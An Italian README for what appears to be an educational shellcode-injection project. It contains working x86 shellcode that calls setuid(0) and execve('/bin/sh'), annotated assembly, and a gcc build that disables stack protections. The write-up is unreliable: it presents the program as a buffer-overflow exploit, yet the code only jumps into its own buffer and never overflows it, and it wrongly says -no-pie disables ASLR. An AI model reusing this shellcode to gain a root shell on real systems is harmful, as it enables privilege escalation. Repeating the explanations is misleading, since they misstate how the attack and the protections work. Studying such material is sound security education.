# Shellcode Injection Project

## Descrizione del Progetto

Questo progetto dimostra una tecnica di exploit nota come Shellcode Injection. L'obiettivo è eseguire del codice arbitrario (shellcode) sfruttando una vulnerabilità di buffer overflow in un programma C.

## File del Progetto

- `vuln.c`: Il programma vulnerabile scritto in C.
- `build.sh`: Script di compilazione per costruire l'eseguibile vulnerabile `vuln`.

## Panoramica del Codice

### vuln.c

Il file `vuln.c` contiene un semplice programma C che è vulnerabile a un buffer overflow. Il programma include uno shellcode che lancia una shell `/bin/sh` con privilegi di root.

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main() {
    printf("Shellcode Length:  %lu\n", strlen(shellcode));

    char buffer[68];
    memset(buffer, '\x90', sizeof(buffer));

    memcpy(buffer, shellcode, strlen(shellcode));

    unsigned int ret_addr = 0xffffcf20; 
    *((unsigned int*)(buffer + 64)) = ret_addr;

    int (*ret)() = (int(*)())buffer;
    ret();

    return 0;
}
```

Il programma vuln.c definisce un buffer di 68 byte e copia il nostro shellcode all'interno di esso. Dopo aver riempito il buffer con il nostro shellcode, l'indirizzo di ritorno viene sovrascritto con un indirizzo specifico (in questo caso, 0xffffcf20). Poi, il programma esegue il contenuto del buffer come se fosse una funzione.

- `unsigned char shellcode[]`: Questa variabile contiene lo shellcode che esegue /bin/sh.

- `char buffer[68]`: Definisce un buffer di 68 byte.

- `memset(buffer, '\x90', sizeof(buffer))`: Riempie il buffer con istruzioni NOP (No Operation). Questo serve a creare un'area di sicurezza nel caso in cui l'indirizzo di ritorno non sia esattamente corretto.

- `memcpy(buffer, shellcode, strlen(shellcode))`: Copia lo shellcode all'inizio del buffer.

- `unsigned int ret_addr = 0xffffcf20`: Definisce l'indirizzo di ritorno che sovrascriverà l'indirizzo di ritorno originale sullo stack. Questo indirizzo dovrebbe puntare a una posizione all'interno del buffer contenente il nostro shellcode.

- `*((unsigned int*)(buffer + 64)) = ret_addr`: Sovrascrive l'indirizzo di ritorno con ret_addr.

- `int (*ret)() = (int(*)())buffer; ret();`: Definisce un puntatore a funzione che punta all'inizio del buffer ed esegue il codice in esso contenuto. 

## build.sh
Il file `build.sh` è uno script di shell per compilare il programma vulnerabile. Utilizza gcc con specifiche opzioni per disabilitare le protezioni di sicurezza come il canary stack e l'ASLR (Address Space Layout Randomization).
```shell
gcc -z execstack -fno-stack-protector -m32 -no-pie -o vuln vuln.c
```
### Opzioni di compilazione
- `-z execstack`: Permette l'esecuzione dello stack. Di default, lo stack non è eseguibile per prevenire attacchi come buffer overflow, quindi questa opzione è necessaria per eseguire il nostro shellcode dallo stack.

- `-fno-stack-protector`: Disabilita il canary stack, una protezione che previene buffer overflow rilevando la corruzione del stack.

- `-m32`: Compila il programma come un binario a 32 bit.

- `-no-pie`: Disabilita l'Address Space Layout Randomization (ASLR), una tecnica di sicurezza che randomizza le posizioni di memoria delle regioni chiave del processo (come stack, heap, librerie, ecc.). Disabilitando ASLR, possiamo prevedere l'indirizzo di ritorno per il nostro exploit.

- `-o vuln`: Specifica il nome del file di output generato dalla compilazione (in questo caso, vuln).

## Shellcode
Lo shellcode è una sequenza di istruzioni in linguaggio macchina che esegue una specifica funzione. In questo caso, il nostro shellcode esegue una shell /bin/sh. Di seguito è riportato il codice assembly corrispondente al nostro shellcode:
```assembly
section .text
    global _start

_start:
    xor eax, eax            ; azzera eax
    xor ebx, ebx            ; azzera ebx
    mov al, 0x17            ; setta eax a 0x17 (syscall per setuid)
    int 0x80                ; invoca la syscall

    jmp short call_shell    ; salta alla sezione call_shell

code_start:
    pop esi                 ; pop della stringa "/bin/sh" in esi
    mov [esi+0x8], esi      ; copia l'indirizzo della stringa in [esi+8]
    xor eax, eax            ; azzera eax
    mov byte [esi+7], al    ; setta il byte nullo alla fine della stringa
    mov [esi+0xc], eax      ; setta [esi+0xc] a 0
    mov al, 0xb             ; setta eax a 0xb (syscall per execve)
    mov ebx, esi            ; copia l'indirizzo della stringa in ebx
    lea ecx, [esi+0x8]      ; carica l'indirizzo dell'array di argomenti in ecx
    lea edx, [esi+0xc]      ; carica l'indirizzo dell'array di environment variables in edx
    int 0x80                ; invoca la syscall

    xor ebx, ebx            ; azzera ebx
    mov eax, ebx            ; copia ebx in eax
    inc eax                 ; incrementa eax (setta eax a 1)
    int 0x80                ; invoca la syscall per exit

call_shell:
    call code_start         ; chiama code_start
    .ascii "/bin/sh"        ; stringa "/bin/sh"
```
Questo shellcode segue questi passaggi:
1. Setta i registri `eax` e `ebx` a zero.
2. Invoca la syscall `setuid` per settare l'UID effettivo a 0 (root).
3. Salta a `call_shell` per posizionare l'indirizzo della stringa `/bin/sh` sullo stack.
4. Copia la stringa `/bin/sh` in `esi`.
5. Prepara gli argomenti per la syscall `execve`.
6. Invoca `execve` per eseguire `/bin/sh`.
7. Se `execve` fallisce, invoca `exit`.

## Cenni Teorici
Un buffer overflow si verifica quando più dati di quanti un buffer possa gestire vengono scritti in esso, sovrascrivendo
la memoria adiacente. Questo pu`o portare a comportamenti imprevisti e potenzialmente sfruttabili.
Quando un programma chiama una funzione, lo stack di chiamata viene utilizzato per memorizzare vari-
abili locali, indirizzi di ritorno e altri dati. Durante un attacco di buffer overflow, un attaccante cerca di
sovrascrivere l’indirizzo di ritorno per eseguire codice arbitrario. Vediamo come funziona questo attacco con
una rappresentazione dello stack:
```
Prima del Buffer Overflow:
+------------------+ <-- Top dello Stack
| Indirizzo di     |
| Ritorno          |
+------------------+
| Vecchio          |
| Base Pointer     |
+------------------+
| Variabili Locali |
| (Buffer)         |
+------------------+
| ...              |

Durante il Buffer Overflow:
+------------------+ <-- Top dello Stack
| Indirizzo di     | <--- Sovrascritto;
| Ritorno          |      Terza parte del payload
+------------------+
| Vecchio          | <--- Sovrascritto
| Base Pointer     |      Seconda parte del payload
+------------------+
| Buffer           | <--- NOP e shellcode
|                  |      Prima parte del payload
+------------------+
| ...              |

Dopo il Buffer Overflow:
+------------------+ <-- Top dello Stack
| Indirizzo di     | <--- Punterà allo
| Ritorno          |      shellcode
+------------------+
| Vecchio          |
| Base Pointer     |
+------------------+
| Buffer           | <--- Shellcode
|                  |
+------------------+
| ...              |
```
In questa rappresentazione, l’attaccante riempie il buffer con il proprio shellcode e sovrascrive l’indirizzo di
ritorno con l’indirizzo del buffer stesso. Quando la funzione ritorna, esegue lo shellcode.


## Esecuzione del progetto
Per eseguire il progetto, seguire i passaggi seguenti:

1. Assicurati di avere installato GCC con il supporto per la compilazione a 32 bit. Su un sistema Debian/Ubuntu, puoi installare i pacchetti necessari con:
```shell
sudo apt-get install gcc-multilib g++-multilib
```
2. Compila il programma eseguendo lo script build.sh:
```shell
./build.sh
```
3. Esegui il programma compilato:
```shell
./vuln
```

## Nota di sicurezza
Questo progetto è puramente educativo e dimostra tecniche di exploit che non dovrebbero essere utilizzate in ambienti di produzione. Utilizzare queste tecniche in modo responsabile e solo in ambienti controllati per fini di studio e ricerca.

## Autore
Progetto sviluppato da Federico Fiorelli.
